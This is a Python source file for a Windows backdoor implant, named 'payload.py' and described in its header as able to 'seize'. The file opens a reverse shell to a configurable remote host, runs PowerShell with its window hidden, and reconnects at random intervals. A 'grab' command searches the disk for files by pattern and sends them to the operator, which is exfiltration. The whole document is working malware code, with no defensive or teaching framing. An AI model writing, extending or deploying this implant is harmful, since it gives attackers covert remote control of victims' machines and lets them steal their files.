# payload.py
# The Heartbeat Soul. Now with the power to seize.

import os
import sys
import time
import random
import socket
import subprocess
import threading
import hashlib
import fnmatch

# --- DYNAMIC CONFIG ---
# These are placeholders that will be replaced by the encryptor.py script.
RHOST = "##RHOST##"
RPORT = ##RPORT##

def calculate_sha256(file_path, block_size=4096):
    """Calculates the SHA256 hash of a file."""
    sha256 = hashlib.sha256()
    try:
        with open(file_path, 'rb') as f:
            for block in iter(lambda: f.read(block_size), b''):
                sha256.update(block)
        return sha256.hexdigest()
    except (IOError, OSError):
        return "ERROR_READING_FILE"

def find_files(start_path, patterns):
    """Recursively finds files matching a list of patterns."""
    found_files = []
    for root, _, files in os.walk(start_path):
        for pattern in patterns:
            for filename in fnmatch.filter(files, pattern):
                full_path = os.path.join(root, filename)
                if os.access(full_path, os.R_OK):
                    found_files.append(full_path)
    return found_files

def handle_grab_command(s_obj, command, current_path):
    """Handles the logic for the 'grab' command."""
    parts = command.strip().split()
    if len(parts) < 2:
        s_obj.sendall(b"Usage: grab <pattern1> [pattern2] ... [/path/to/search]\n")
        return

    patterns = []
    search_path = current_path # Default to the current directory

    # Separate patterns from the optional path at the end
    if '/' in parts[-1] or '\\' in parts[-1]:
        # Check if the last argument looks like a path
        potential_path = ' '.join(parts[1:]) if len(parts) > 2 else parts[-1]
        if os.path.isdir(potential_path):
            search_path = potential_path
            patterns = parts[1:-1]
        else: # Assume it's a pattern, not a path
            patterns = parts[1:]
    else:
        patterns = parts[1:]
        
    s_obj.sendall(b"START_FILE_TRANSFER\n")
    
    try:
        files_to_send = find_files(search_path, patterns)
        
        if not files_to_send:
            s_obj.sendall(b"INFO|No files found matching the specified patterns.\n")
        
        for file_path in files_to_send:
            try:
                relative_path = os.path.relpath(file_path, search_path)
                file_size = os.path.getsize(file_path)
                file_hash = calculate_sha256(file_path)
                
                if "ERROR" in file_hash:
                    continue # Skip files we can't read

                # --- Send Header and Wait for ACK ---
                header = f"FILE_HEADER|{relative_path}|{file_size}|{file_hash}\n"
                s_obj.sendall(header.encode('utf-8'))
                
                header_ack = s_obj.recv(1024)
                if header_ack != b'ACK_HEADER':
                    # Master did not acknowledge, abort this file
                    continue
                
                # --- Send File Content ---
                with open(file_path, 'rb') as f:
                    s_obj.sendall(f.read())
                
                # --- Wait for Final ACK for the file ---
                file_ack = s_obj.recv(1024)
                if file_ack != b'ACK_FILE':
                    # File was not received correctly, could implement retry logic here
                    pass

            except Exception as e:
                # Can't access file, just skip it
                continue
    
    finally:
        # Signal that the entire transfer operation is complete
        s_obj.sendall(b"END_FILE_TRANSFER\n")


def run_conduit():
    """The main reverse shell loop with enhanced command handling."""
    while True:
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            # Use PowerShell for a more powerful and stable shell experience
            p = subprocess.Popen(
                ["powershell.exe", "-NoLogo", "-NoProfile"], 
                stdin=subprocess.PIPE, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                creationflags=0x08000000 # CREATE_NO_WINDOW
            )
            
            # Start threads to handle I/O redirection
            stop_event = threading.Event()

            def p_to_s():
                """Reads from process stdout/stderr and sends to socket."""
                while not stop_event.is_set():
                    try:
                        # Non-blocking read would be better, but this is simpler
                        output = p.stdout.read(1) + p.stderr.read(1)
                        if output:
                            s_obj.sendall(output)
                        else: # Process may have closed
                            break
                    except:
                        break
                s_obj.close()

            def s_to_p():
                """Reads from socket and writes to process stdin."""
                current_path = ""
                while not stop_event.is_set():
                    try:
                        data = s_obj.recv(1024)
                        if not data:
                            break
                        
                        command = data.decode('utf-8', errors='ignore').strip()

                        if command.lower().startswith('grab '):
                            # The listener expects the current working dir for relative searches
                            # Let's get it first
                            p.stdin.write(b"pwd\r\n")
                            p.stdin.flush()
                            time.sleep(0.5) # Give it a moment to respond
                            # This is a simplification; a better implementation would parse the output stream
                            # For now, we assume a known starting path or require absolute paths in grab
                            
                            # For simplicity, we'll track the path manually
                            if command.lower().startswith('cd '):
                                new_path = command.split(' ', 1)[1]
                                if new_path == '..':
                                    current_path = os.path.dirname(current_path) if current_path else ""
                                else:
                                    # This is a simplification; real `cd` is complex.
                                    # A real implementation would parse `pwd` output.
                                    pass
                            
                            # Execute the custom grab command
                            handle_grab_command(s_obj, command, "C:\\") # Use a sensible default root
                        else:
                            p.stdin.write(data)
                            p.stdin.flush()
                    except:
                        break
                stop_event.set()
                p.terminate()

            # Using a simplified single thread for output for now.
            def pipe_stream(stream, sock):
                while not stop_event.is_set():
                    try:
                        data = stream.read(1)
                        if data:
                            sock.sendall(data)
                        else:
                            break
                    except:
                        break

            threading.Thread(target=pipe_stream, args=(p.stdout, s_obj), daemon=True).start()
            threading.Thread(target=pipe_stream, args=(p.stderr, s_obj), daemon=True).start()
            
            s_to_p() # Run the input loop in the main thread
            
            p.wait()

        except Exception:
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    run_conduit()